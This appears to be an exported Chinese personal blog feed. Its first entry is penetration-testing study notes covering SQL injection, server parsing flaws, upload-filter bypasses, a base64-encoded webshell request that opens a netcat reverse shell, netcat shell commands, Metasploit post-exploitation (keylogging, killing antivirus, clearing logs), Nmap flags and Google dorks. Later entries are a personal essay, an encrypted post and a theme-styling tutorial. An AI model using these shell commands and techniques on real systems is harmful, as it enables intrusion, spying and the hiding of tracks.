&#39;1&#39;=&#39;1,在代码处由于字符型需要加单引号或者双引号。例如:select from admin where a=&#39;a&#39;搜索型注入：%&#39;小迪第七讲通过 load_file 读取后台文件 例如：前台页面向后台login.php传递参数并判断然后跳转 这时候可以通过 load_file sql注入语句来读取login.php文件小迪第九讲服务器常见状态码：123451XX：正在处理2XX：成功3XX：重定向4XX：客户端错误 403：存在（没权限） 404：不存在5XX：服务器错误 500：可能存在小迪第十讲该课程主要讲解mssql综合利用工具，由于是工具利用，所以并没有详细记录。小迪第十一讲验证机制分为：本地、远程。本地验证可以通过禁用、删除等方式进行绕过。解析漏洞：1234567891011IIS6.0：文件名： 1.asp;.jpg文件夹：用户名为 1.asp 文件类型：1.jpgIIS7.X uginx：http://www.xxx.com/logo.gif解析漏洞:http://www.xxx.com/logo.gif/x/phpapache:首先是否系统能否解析的后缀名http://www.xxx.com/logo.php.asdasd 最后的后缀无法识别 便继续往前推小迪第十二讲IIS 解析漏洞利用path：a.asp;.,在上传的时候通过修改文件前缀。不单单是文件前缀，如果上传包中存在path，可以通过修改path。因为有时候验证是通过文件名filename，而不验证filepath。图片马使用UE（uedit）编辑器即可添加。小迪第十四讲针对上传绕过时，首先需要知道过滤方式。可通过多次上传来猜解其过滤方式。利用手段00截断：1.asp’\0’.jpg:通过UE将上传包保存为文本文档在上传文件名后面加上：空格 .jpg。例如 1.asp .jpg。通过UE将空格 20 修改为 00在上传包文本中 包长度 length 数值加5检验文件类型 通过抓包修改过滤不全 asp asa cer cdx htr检验文件头：在文件头前面加上 GIF89a工具一句话流量学习1234567891011# url执行命令POST /test.php HTTP/1.1X-Forwarded-For: 199.1.88.29Referer: http://192.168.168.147Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0Host: 192.168.168.147Content-Length: 569Cache-Control: no-cachecmd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=L2Jpbi9zaA%3D%3D&amp;z2=Y2QgIi92YXIvd3d3L2h0bWwvIjtuYyAxOTIuMTY4LjEwLjExIDEzMzcgLWUgL2Jpbi9iYXNoO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ%3D%3DNC工具123456正向连接： 服务器命令：nc -l -p 1337 -e /bin/bash 客服端使用：nc &gt;nc x.x.x.x 1337反向连接： 服务器命令：nc 192.168.10.11 1337 -e /bin/bash 客户发命令：nc -lvv -p 1337Metasploit-msfconsole工具Metasploit是一个优秀的渗透测试框架！！！！！！！攻击阶段：使用msfconsole打开Metasploit使用nmap扫描来发现开放端口nmap -T4 -A -v x.x.x.x使用search命令来搜索需要的exp使用use命令来打开exp，之后使用show options查看需要指定的参数使用set rhost等来设置参数之后，通过exploit来获取meterpreter会话信息收集阶段：获取服务器信息（sysinfo、getuid、idletime、run get_env、ifconfig、route）获取服务器当前截屏（screenshot）获取服务器进程信息（ps）将 meterpreter会话迁移至explorer（migrate）开启键盘记录，输出（keyscan_start、keyscan_dump）获取服务器shell（shell）检测服务器是否为虚拟机（run checkvm）启动远程桌面（run getgui -e）;启动telnet服务（run gettelnet -e）获取子网状况（run get_local_subnets）编辑hosts（run hostedit）查看已经登录的用户数（run enum_logged_on_users）获取已安装应用程序（run get_application_list）获取驱动器信息（run windows/gather/forensics/enum_drives）获取产品密钥（run windows/gather/enum_ms_product_keys）获取autologin（run windows/gather/credentials/windows_autologin）使用自动脚本获取系统信息（run winenum）获取服务器额外信息（run scraper；信息存放路径为：.msf5/logs/scrips/scraper/192.x.x.x.x）清理痕迹阶段：检测防火墙状态（run getcountermeasure）关闭杀毒软件（run killav；find / -name ‘killav.rb’；/usr/share/metasploit-framework/scripts/meterpreter/killav.rb）清理日志（clearev）NmapNmap常用命令汇总记录123456789101112131415161718192021222324252627Nmap常用命令参数讲解-d [level] (提高或设置调试级别) 。 -sT tcp端口扫描(完整三次握手)。-sU udp扫描。(不回应可能端口打开,回应是关闭) -sL dns反向解析。 -sM[fin ack mainmon扫描] 。-sS隐蔽扫描(半开syn)。-sP发现扫描网络存活主机。(直连arp非直连tcp80 icmp)-sO确定主机协议扫描。-sA tcp ACK扫描。-sW 对滑动窗口的扫描sI[idlescan]。-sR RPC扫描。(flag没有syn,ack,rst回送rst)-sN 关闭主机发现【空】。(不管是否存在直接扫描)-sF FIN扫描 。(sN sF sX逃避不了ids)-sX Xmas扫描 (fin psh urg为置位)。-sI 完全隐藏。【以一个跳板主机&#123;无流量&#125;扫描另一台主机】-sV 服务版本。-sC 跟安全有关的脚本-P0 指定协议。(不ping主机)(1icmp6tcp17udp47gre50esp51ah53swipe77sun-nd115l2tp120uti132sctp) -PS 端口列表用,隔开[tcp80 syn 扫描]-PA 端口列表用,隔开[ack扫描](PS+PA测试状态包过滤防火墙【非状态的PA可以过】)【默认扫描端口1-1024】-PU 端口列表用,隔开[udp高端口扫描 穿越只过滤tcp的防火墙]-PE [icmp ping types]-PM 掩码请求。-PR [arp ping] 默认直连用。-PN 自己。-PP 时间请求。GoogleHack使用Google搜索往往能获得意想不到的信息。1234567891011121314151617ps：不区分大小写all开头一次查询只能使用一个intext:关键词 （搜索页面正文包含关键词的网页）allintext:关键词,关键词 （拼接多个关键词）intitle:关键词 （搜索页面标题包含关键词的网页）allintitle:关键词,关键词 （拼接多个关键词）cache:url （搜索特定页面的快照）defind:关键词 （搜索关于关键词的定义，不能与其他操作符混用）filetype:关键词 （搜索所有以关键词为后缀的文件的url） ext:关键词 （性质与filetype一致）info: 搜索输入URL的摘要信息和其他相关信息，该操作符不能与其他操作符及关键字混用inurl:关键词 （搜索url中包含关键词的网页）allinurl:关键词,关键词 （搜索url中包含多个关键词的网页）site:url （将搜索范围缩小到特定的网站，域或子域）*（通配符）-（排除符号）]]></content>
      <categories>
        <category>安全研究</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[世界上最不能等待的事]]></title>
    <url>%2Farchives%2F595705f9.html</url>
    <content type="text"><![CDATA[世界上最不能等待的事不是不想不愿，只是没发现。今天晚上看了网易云音乐上面的《世界上最不能等待的事》MV，世界上有许许多多不能等待的事：工作、生活、友情、爱情、亲情等等。每个人不能把所有的方方面面都考虑到，像我这种处女座任何事情都想考虑的全面、具体。希望所有不能等待的事都能早早的去实现！]]></content>
      <categories>
        <category>诗和远方</category>
        <category>远方</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[想说给你听]]></title>
    <url>%2Farchives%2F3120f2c3.html</url>
    <content type="text"><![CDATA[是你吗？你的姓氏拼音 Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>诗和远方</category>
        <category>诗</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Blog美化]]></title>
    <url>%2Farchives%2F11804e57.html</url>
    <content type="text"><![CDATA[上篇文章对配置进行了记录，本篇文章记录nexT的美化工作。效果图呈现：前言通过上一章Blog更新&配置文件详解的内容基本能满足大部分的需求，如果想要逼格高一点、深度优化，可以对里面的一些文件（swig、js等）进行新增、修改等。美化点击特效点击特效可通过JS来实现，大家可以选择自己喜欢的特效，调用JS即可。我选择的是点击桃心特效，js源码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566(function(window,document,undefined)&#123; var hearts = []; window.requestAnimationFrame = (function()&#123; return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function (callback)&#123; setTimeout(callback,1000/60); &#125; &#125;)(); init(); function init()&#123; css(".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"); attachEvent(); gameloop(); &#125; function gameloop()&#123; for(var i=0;i&lt;hearts.length;i++)&#123; if(hearts[i].alpha &lt;=0)&#123; document.body.removeChild(hearts[i].el); hearts.splice(i,1); continue; &#125; hearts[i].y--; hearts[i].scale += 0.004; hearts[i].alpha -= 0.013; hearts[i].el.style.cssText = "left:"+hearts[i].x+"px;top:"+hearts[i].y+"px;opacity:"+hearts[i].alpha+";transform:scale("+hearts[i].scale+","+hearts[i].scale+") rotate(45deg);background:"+hearts[i].color; &#125; requestAnimationFrame(gameloop); &#125; function attachEvent()&#123; var old = typeof window.onclick==="function" &amp;&amp; window.onclick; window.onclick = function(event)&#123; old &amp;&amp; old(); createHeart(event); &#125; &#125; function createHeart(event)&#123; var d = document.createElement("div"); d.className = "heart"; hearts.push(&#123; el : d, x : event.clientX - 5, y : event.clientY - 5, scale : 1, alpha : 1, color : randomColor() &#125;); document.body.appendChild(d); &#125; function css(css)&#123; var style = document.createElement("style"); style.type="text/css"; try&#123; style.appendChild(document.createTextNode(css)); &#125;catch(ex)&#123; style.styleSheet.cssText = css; &#125; document.getElementsByTagName('head')[0].appendChild(style); &#125; function randomColor()&#123; return "rgb("+(~~(Math.random()*255))+","+(~~(Math.random()*255))+","+(~~(Math.random()*255))+")"; &#125;&#125;)(window,document);将上面源码存放为click.js文件内，将click.js文件放在/hexo/themes/next/source/js/src\路径下。打开 /hexo/themes/next/layout/_layout.swig 文件， 在head标签内最后位置添加以下代码：1&lt;script type="text/javascript" src="/js/src/click.js"&gt;&lt;/script&gt;修改文章内链接文本样式修改文件/themes/next/source/css/_common/components/post/post.styl，在末尾添加如下css样式：12345678910.post-body p a&#123; color: #0593d3; border-bottom: none; border-bottom: 1px solid #0593d3; &amp;:hover &#123; color: #fc6423; border-bottom: none; border-bottom: 1px solid #fc6423; &#125;&#125;文章底部标签样式修改模板/hexo/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#，将 # 换成或者可以从这里自己挑。1&lt;a href="&#123;&#123; url_for(tag.path) &#125;&#125;" rel="tag"&gt;&lt;i class="fa fa-tag"&gt;&lt;/i&gt;&#123;&#123; tag.name &#125;&#125;&lt;/a&gt;文章末尾添加结束标记在路径/hexo/themes/next/layout/_macro/中新建 passage-end-tag.swig 文件,并添加以下内容：12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------本文结束&lt;i class="fa fa-heart-o" aria-hidden="true"&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt;接着打开/hexo/themes/next/layout/_macro/post.swig文件，post-footer之前添加如下代码（post-footer之前两个DIV）：12345678910111213141516171819&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125; &lt;/div&gt; &#123;% if (theme.alipay or theme.wechatpay or theme.bitcoin) and not is_index %&#125; &lt;div&gt; &#123;% include 'reward.swig' %&#125; &lt;/div&gt; &#123;% endif %&#125; &#123;% if theme.post_copyright.enable and not is_index %&#125; &lt;div&gt; &#123;% include 'post-copyright.swig' with &#123; post: post &#125; %&#125; &lt;/div&gt; &#123;% endif %&#125; &lt;footer class="post-footer"&gt;打开主题配置文件/hexo/themes/next/_config.yml,在末尾添加：123# 文章末尾添加结束标记passage_end_tag: enabled: true侧边栏作者头像修改把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果，修改/hexo/themes/next/source/css/_common/components/sidebar/sidebar-author.styl:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* 头像圆形 */ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/ -webkit-animation: play 2s ease-out 1s 1; -moz-animation: play 2s ease-out 1s 1; animation: play 2s ease-out 1s 1; /* 鼠标经过头像旋转360度 */ -webkit-transition: -webkit-transform 1.5s ease-out; -moz-transition: -moz-transform 1.5s ease-out; transition: transform 1.5s ease-out;&#125;img:hover &#123; /* 鼠标经过停止头像旋转 -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* 鼠标经过头像旋转360度 */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg);&#125;/* Z 轴旋转动画 */@-webkit-keyframes play &#123; 0% &#123; -webkit-transform: rotateZ(0deg); &#125; 100% &#123; -webkit-transform: rotateZ(-360deg); &#125;&#125;@-moz-keyframes play &#123; 0% &#123; -moz-transform: rotateZ(0deg); &#125; 100% &#123; -moz-transform: rotateZ(-360deg); &#125;&#125;@keyframes play &#123; 0% &#123; transform: rotateZ(0deg); &#125; 100% &#123; transform: rotateZ(-360deg); &#125;&#125;.site-author-name &#123; margin: $site-author-name-margin; text-align: $site-author-name-align; color: $site-author-name-color; font-weight: $site-author-name-weight;&#125;.site-description &#123; margin-top: $site-description-margin-top; text-align: $site-description-align; font-size: $site-description-font-size; color: $site-description-color;&#125;背景&amp;透明度美化背景图片在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：1234567body&#123; background:url(图片链接); background-size:cover; background-repeat:no-repeat; background-attachment:fixed; background-position:center; &#125;文字背景色设置在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：12345.content &#123; border-radius: 10px; margin-top: 60px; background:rgba(颜色rgb,透明度) none repeat scroll !important; &#125;代码块美化这块工作让我头痛了很久！！！代码块透明度设置，在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:12345678910111213141516171819202122232425262728// 单行代码块设置code &#123; background:rgba(241,241,241,0.3); margin: 2px;&#125;// 多行代码块的自定义样式.highlight&#123; 